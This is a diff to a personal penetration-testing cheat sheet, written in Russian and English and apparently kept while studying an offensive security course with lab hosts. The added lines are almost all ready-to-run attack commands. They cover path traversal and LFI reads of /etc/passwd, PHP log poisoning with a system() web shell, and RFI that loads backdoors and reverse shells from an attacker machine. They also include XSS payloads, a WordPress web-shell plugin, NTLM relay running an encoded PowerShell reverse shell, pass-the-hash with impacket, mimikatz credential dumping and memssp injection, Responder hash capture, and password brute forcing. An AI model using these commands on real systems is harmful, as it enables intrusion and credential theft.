@@ -1,18 +1,28 @@
 export key="value"
-        setup variable for all subprocess (iverwise set key="value" only for current user)
+        setup variable for all subprocess (overwise set key="value" only for current user)
 !!      повторить последнюю команду
 wc      подсчет байт/символов/слов/строк в файле
 sed     редактирование на лету (stream editing: sed 's/from/to/')
-cat file | grep pattern | cut -d ' ' -f 4 | tr -d '%' | sort | uniq
+cat file | grep pattern | cut -d ' ' -f4 | tr -d '%' | sort | uniq
 cut -d ":" -f 2 <file>
         divider ":", field 2, from every line in file
 awk -F "::" '{print $1 $5}'
         продвинутый cut, подволяет задавать в качестве разделителя более 1 символа
+grep target file.txt
+	найти строки с target в файле file.txt
 sort    сортировка вывода 
 uniq -c подсчет количества повторяющихся строк, т.к. сравнивает только с соседними
 w       список зашедших в систему пользователей
 
-target validation: whois, nslookup, dnsrecon
+whois <url> -h <WHOIS SERVER IP>		WHOIS SERVER IP подставляет значения в полях вывода команды
+host megacorpone.com				получмить IP и mail сервера (также по ключу "-t mx")
+nslookup mail.megacorptwo.com			тоже самое, больше вывод
+for ip in $(cat list.txt); do host $ip.megacorpone.com; done
+for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
+dnsrecon -d target.com -t brt -D /usr/share/wordlists/dns.txt
+	обе команды перебора поддоменов сайта по словарю
+dnsenum megacorpone.com
+	перебор поддоменов, комплексный анализ
 
 arp -a
 arp-scan -l
@@ -21,18 +31,33 @@ netstat -ano
 
 netdisover -r ip/net
 	поиск хостов в сети
+sudo nbtscan -r 192.168.50.0/24
+	просмотр netbios имен хостов сети
 
+nc -nvv -w 1 -z 192.168.50.152 3388-3390
+nc -nv -u -z -w 1 192.168.50.149 120-123
+	сканирование TCP и UDP портов, nc пишет в stderr, поэтому для фильтрации grep добавить 2>&1 
 nmap -sS ip
 	SYS->SYNACK (without ->ACK) scan of well known ports
-nmap -T4 -p- -A ip
+nmap -T4 -p- -A ip -oG output.txt
 	T[1-5], 5 - agressive, 1 - slow, -T3 - тоже самое, что без ключа T вообще
-	-p- all 65535 ports
-	-A - all: -sC (run scripts) -sV (versions detection) -O (OS detection) --traceroute
+	-p- all 65535 ports,	-sU - UDP,	-sT - tcp сканирование если нет root,	--open - показать только если порт открыт
+	-A - all: -sC (run scripts) -sV (versions detection) -O (OS detection) --traceroute	
+	-oG (лучще -oX) - записать вывод в файл для парсинга позже (grep <target> <filename>)
+sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
+	вывести известные CVE согласно найденной версии, но могут быть закрыты патчем или конфигом, 
+	|_http-stored-xss: Couldn't find... - Проверял, не нашел
+	|_http-trace: TRACE is enabled      - Нашел реальную уязвимость
+sudo nmap --script-updatedb
+	при добавлении нового nse скрипта в папку /usr/share/nmap/scripts/ надо обновить script.db, чтобы его использовть
+enum4linux -R 500-2000 192.168.149.13 2>&1 | grep -i "alfred"
+	сканирование пользователей на системе, id 1000 и более - обычные пользователи, 500 - админ в windows, 0 - root
 curl -v -s <ip> 1>/dev/null
 	-v verbose - выдает метаданные ответа (заголовок страницы - это strerr - pipe 2)
 	без -v выдает тело ответа - strout (pipe 1), -s silence - без вывода % заугрузки
 	1>/dev/null убирает из вывода тело ответа, оставляя только метаданные заголовка
-	
+curl --path-as-is http://192.168.114.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+	ключ --path-as-is для запроса пути как есть, без преобразований и автоматическй оптимизации, url выполнится как есть
 nikto -h ip
 	searching vulns for outdated components
 dnsrecon -r 127.0.0.0/24 -n 192.168.43.226 -d dd
@@ -59,6 +84,10 @@ picture upload - possible reverse shell (php file uploading)
 python -c 'import pty; pty.spawn("/bin/bash")'
 	запуск удобной командной оболочки, предватительно проверить, есть ли питон, иначе - другая командя для tty shell
 	echo $0 - в каком шеле мы находимся (в каком скрипте)
+https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
+	однострочные reverse шелы
+Ctrl+U/Ctrl+Shift+U
+	кодирование/декодирование спец. сиволов в Burp
 
 ssh -i id_rsa -p 2222 dave@192.168.178.201
 	id_rsa - private key, используется с парольной фразой, которую также запросят ввести, файл должен иметь права 600 (!!!)
@@ -72,8 +101,6 @@ gtfobin
 	повышение прав доступа (privilege excalation), web портал с командами повышения до root
 	если sudo -l дало какой-то результат или в системе есть SUID
 
-sc start/query/stop <service name>
-	для перезапуска атакуемого сервиса на Windows, имя сервиса - из вывода winPEAS.exe
 
 =================RECON LINUX
 linPEAS
@@ -88,22 +115,28 @@ showmount -e <ip>
 mount -t ntf <ip>:/<remote path> <local path>
 mount -t nfs 192.168.43.281:/srv/nfs /mnt/dev
 	примонтировать nfs систему локально в local path из пути remote path, найденном утилитой showmaount
+xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution
+	rdp соединение (remmina тоже)
+hURL	декодирование base64 и другого
 
 ================RECON WINDOWS
 systeminfo
+hostname
 wmic qfe	обновления
 wmic qfe get <column>
 whoami /priv	текущие привелегии
 whoami /groups	к каким группам принадлежит пользователь
 net user	список пользователей
-net localgroup [arministrators]
+net view \\dc01 /all		просмотр доступных ресурсов (SMB) на машине dc01
+net localgroup [administrators]
 findstr /si "password=" *.txt *.ini *.config
 dir *.kdbx /s	поиск файлов в подпапках из текущей
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 		тоже самое в powershell
 Get-LocalUser
 	список пользователей
-sc		service control
+sc start/query/stop <service name>
+	для перезапуска атакуемого сервиса на Windows, имя сервиса - из вывода winPEAS.exe
 sc query windefend
 netsh firewall show state
 
@@ -111,16 +144,102 @@ whoami /priv
 	проверка текущих привелегий
 mimikatz.exe
 	программа для извлечения хешей и паролей в винде
-	privilege::name		проверка текущих привелегий
 	privilege::debug	команда первоначально выполняется для сохранения уровня прав последующим командам
 	token::elevate		поднять права в системе до SYSTEM
 	sekurlsa::logonpasswords хеши и пароли пользователей, источник: LSASS.exe (данные, загруженные в памяти процесса активных пользователей)
 	lsadump::sam		только NTLM хеши пользователя, истояник: файл SAM на диске
+    Credential Guard bypass (защита только ): 
+	misc::memssp
+		Внедряет DLL в процессы LSASS для перехвата паролей при входе пользователей и пишет в C:\Windows\System32\mimilsa.log
+		для перехвата пароля в лог файле перехватываемый пользователь должен авторизоваться на удаленной машине
+psexec \\TARGET_HOSTNAME -u DOMAIN\username -p password cmd
+	выполнение команд удаленно от имени администратора
+impacket-psexec -debug -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b [CORP/]Administrator@192.168.50.212
+	соединение по шел к удаленной машине с правами system (но хеш от пользователя Administrator), формат hash: "LMHash:NTHash"
+	CORP/Administrator - в домене CORP, -debug - отладочный вывод
+impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+	тоже самое, но с правами Administrator
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+	установка по умолчанию HTTP и SMB сервера, ключи отключают HTTP сервер (для меньшей нагрузки на логи) и поднимают 2 версию SMB
+	команда -enc в base64 - закодированный "PowerShell reverse shell one-liner" для использования спецсимволов и пробелов
+СХЕМА АТАКИ: !!!UAC на 212 должен быть отключен
+	200: запущен impacket-ntlmrelayx и ожидает соединения от 211 к SMB серверу, ntlmrelayx подключает 211 к 212 с помощью
+	перехваченного хеша, где выполняется base64 реверс шел к 200, который ожидает подключания по nc 
+echo -n "Get-Process" | iconv -t UTF-16LE | base64 -w 0
+	подготовка команды Get-Process для windows, спец. символы кодируются 2 байтами
+	-n убирает перенос строки в конце - нужно для Powershell, -w 0 выводит base64 одной строкой
+1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
+	сканирование портов, когде нет nmap
+
+================RECON WEB
+curl http://<ip>/robots.txt
+GET: параметры в URL, POST: параметры в теле запроса
+
+XSS: стащить куки, выпонить код в браузере жертвы, получить куки, nonce
+ключевые символы: < > ' " { } ;
+	1. Между тегами:	<div>ТВОЙ_ВВОД</div>		<--	<script>alert(1)</script>
+								<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+									<img src=x onerror=alert(1)>
+									<svg onload=alert(1)>
+	2. В атрибуте:		<input value="ТВОЙ_ВВОД">	<--	" onmouseover="alert(1)
+									' onfocus=alert(1) autofocus=
+	3. Внутри тега:		<a href="ТВОЙ_ВВОД">Click</a>	<--	javascript:alert(1)
+									';alert(1);'
+									</script><script>alert(1)</script>
+PAYLOAD ENCODING: <<файл js>>
+https://jscompress.com/
+	curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,...,59))</script>" --proxy 127.0.0.1:8080
+СХЕМА АТАКИ (nonce): загрузка страницы (ajax), извлечение nonce, использование его для операции добавления своего аккаунта админа
+	https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/
+CSRF: выполнить операцию на сайте за пользователя, который уже залогинен там
+ДОБАВЛЕНИЕ ПЛАГИНА WORDPRESS: <<wp-plugin-webshell.php>> -> добавить в zip архив, загрузить и активировать
+	curl -X POST '192.168.177.16/wp-content/plugins/webshell/webshell.php' --data "action=exec&cmd=id"
+	curl -X POST '192.168.177.16/wp-content/plugins/webshell/webshell.php' --data "action=download&cmd=/etc/passwd"
+	wp-plugin-webshell-console.py -t 192.168.177.16
+
+================PATH TRAVERSAL
+curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
+curl --path-as-is http://192.168.171.16:3000/public/plugins/mysql/../../../../../../../../../../etc/passwd
+curl --path-as-is http://192.168.164.193:3000/public/plugins/mysql/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CUsers%5Cinstall.txt
+	для Windows: не надо писать "C:", а "%5C" = "\"
+	--path-as-is обязателен, если ../ в пути URL, а не в параметрах (после "?")
+
+================LFI
+curl http://192.168.210.193/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+curl http://192.168.210.193/meteor/index.php?page=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cxampp%5capache%5clogs%5caccess.log
+	файл логов для добавления команд, можно посмотреть с помощью curl
+<?php echo system($_GET['cmd']); ?>
+	внедряемая команда для php, после того, как это добавилось в файл лога, эта строка сохраняется, например,
+	в месте User-Agent, и там же выводится результат выполнения позже 
+	можно выполнять команды: добавить в конце URL "&cmd=ls", для curl URL надо заключать в кавычки, если есть & внутри
+
+================RFI
+curl "http://192.168.222.16/meteor/index.php?page=http://<attack ip>/simple-backdoor.php&cmd=ls"
+	на атакующей машине в папке, где находится simple-backdoor.php должен запущен сервер: "python -m http.server 80"
+curl "http://192.168.222.16/meteor/index.php?page=http://<attack ip>/php-reverse-shell.php"
+	на атакующей машине помимо сервера (python -m http.server 80) еще запустить "nc -lvp 4444", также поменять ip и порт в php скрипте
+
+
+================PHP WRAPPER
+curl http://192.168.222.16/meteor/index.php?page=php://filter/resource=admin.php
+	просто выполняет код страницы/выводит html
+php://filter/convert.base64-encode/resource
+curl http://192.168.222.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+	выводит base64 кодировку кода страницы
+data://text/plain,<?php%20echo%20system('ls');?>	работает, если "allow_url_include" включен (по умоланию выключен)
+data://text/plain;base64,PD9waHAgZWNobyAiaGVsbG8iOyA/Pg==
+curl "http://192.168.222.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+	исполняет команду ls на странице
+
 
 ================FUZZING
 gobuster - на Go, только консоль (более современная версия dirb и dirbuster)
 gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
+	есть ключ -t (thread), по умолчанию 10
+	скрипт --script=http-enum в nmap также перебирает папки на хосте (вместе с -p80)
 gobuster vhost -u http://target.com -w subdomains.txt
+gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
+	перебор API по шаблону в файле pattern ({GOBUSTER}/v1\n{GOBUSTER}/v2): получили http://192.168.177.16:5002/users/v1
 ffuf - более современный
 	перечисление разных web путей, показываются доступные web страницы
 ffuf -u http://ip/FUZZ -w <path to txt files with words> -s -t 10
@@ -159,17 +278,48 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=4444 EXITFUNC=th
 
 mona.py на github - плагин для Immunity debugger для проверки, какие модули не имеют защиты ASLR, SEH и др.
                       
-==========SAMBA                                   
+==========SAMBA	445                                   
 smbclient -L \\\\ip\\
 	попытка подключения к samba серверу, smbclient \\\\ip\\ IPC$
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+	соединение к удаленной машине с хешем пользователя
 crontab -l
 	поиск задач в cron от текущего пользователя
 crontab -u root -l
 systemctl list-timers
 	перечисление всех запускаемых по времени служб на сервере
+sudo responder -I tun0
+	разворачивает сервера разных служб (HTTP, FTP, SMB, IMAP, SMTP, SNMP и др.) на kali и перехватывает аутентификационные пакеты
+	tap0 берется из вывода ip a
+dir \\192.168.119.2\test
+	подключение к samba из windows (для responder SMB), подключение для перехвата хеша, наличие реальной директории test не нужно
 
+==========BURP
+filename="\\\\192.168.45.232\\share\\test.txt"
+	File uploading (для responder WEB) при загрузке файла заменить путь к нему на путь к SMB сервера для перехвата хеша
+
+==========SMTP	25
+nc -nv <ip> 25
+	подсоединиться к порту почты для отправки команд на сервер:
+	VRFY <username> - проверить наличие пользователя (250 есть, 550 нет)
+	EXPN <group maillist name> - посмотреть список участников группы рассылки
+
+==========SNMP	161 UDP
+for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
+onesixtyone public -i ips
+	вывести список хостов с SNMP, community может быть public/private/manager
+snmpwalk -c public -v1 192.168.50.151 <OID>
+	вывести данные согласно OID:
+	1.3.6.1.4.1.77.1.2.25 - список пользователей
+	1.3.6.1.2.1.25.4.2.1.2 - список процессов
+	1.3.6.1.2.1.25.6.3.1.2 - список установленного ПО
+	1.3.6.1.2.1.6.13.1.3 - список открытых портов
 
 ==========BROUTEFORCE
+curl -X POST http://192.168.192.201/index.php -d "fm_usr=user&fm_pwd=test"
+	проверить вручную
+hydra -L users.txt -p anything 192.168.50.8 smtp-enum
+	перебор 
 hydra -l username -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
 	перебор паролей для пользователя username, порт 2222
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
@@ -180,8 +330,7 @@ hydra -l admin -P passes.txt 192.168.1.1 http-get /admin
 	HTTP Basic Auth (в браузере выскакивает окошко логина): GET /admin HTTP/1.1 \nAuthorization: Basic YWRtaW46cGFzcw==
 hydra -L users.txt -P passes.txt 192.168.1.1 http-get-form "/path:param1=^USER^&param2=^PASS^:Error_string"
 	GET параметры в URL (логин через URL типа ?user=admin&pass=123): GET /login?user=admin&pass=123
-curl -X POST http://192.168.192.201/index.php -d "fm_usr=user&fm_pwd=test"
-	проверить вручную
+hashcat -hh | grep -i <type of hash>
 hashcat -r demo.rule --stdout demo.txt
 	создать список паролей с мутацией согласно правилу demo.rule
 hashcat -m 0 <hash> /usr/share/wordlists/rockyou.txt -r demo.rule --force
@@ -192,24 +341,34 @@ john --wordlist=passwords.txt --rules=sshlabrules ssh.hash
 	когда hashcat не работает, правила предваринельно добавлены в /etc/john/john.conf с заголовком [List.Rules:sshLabRules],
 	поэтому в ключе rules стоит sshlabrules
 	ssh.hash - файл с хешем, полученным как результат ssh2hash
-hashid или hash-identifier	проверить тип хеша
-keepass2john db.kdbx > keepass.hash	преобразовать *.kdbx файл в читаемый johntheripper, не забыть удалить заголовок "Database:"
-ssh2john id_rsa > ssh.hash		преобразовать private key в хеш и еще надо удалить заголовок "id_rsa:"
+hashid или hash-identifier	
+	проверить тип хеша
+keepass2john db.kdbx > keepass.hash
+	преобразовать *.kdbx файл в читаемый johntheripper, не забыть удалить заголовок "Database:"
+ssh2john id_rsa > ssh.hash
+	преобразовать private key в хеш и еще надо удалить заголовок "id_rsa:"
+
 medusa
 	broutforce attack
-hash-identifier
-	определить тип хеша
-
 fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt file.zip
 	взломщик архива по перебору
 
 ============PATHS
+/usr/share/wordlists/dirb/big.txt
+/usr/share/wordlists/dirb/small.txt
+/usr/share/wordlists/dirb/common.txt
+	перебор путей в url
 /usr/share/wordlists/dirb/others/names.txt
 	имена/логины
 /usr/share/wordlists/rockyou.txt
 	пароли
 /usr/share/hashcat/rules/best66.rule
 	правила для мутаций пароля при переборе
+/usr/share/seclists
+	словари для пентеста
+/usr/share/webshells/
+	веб шелы для php/perl/asp и другие
+	
 
 
 
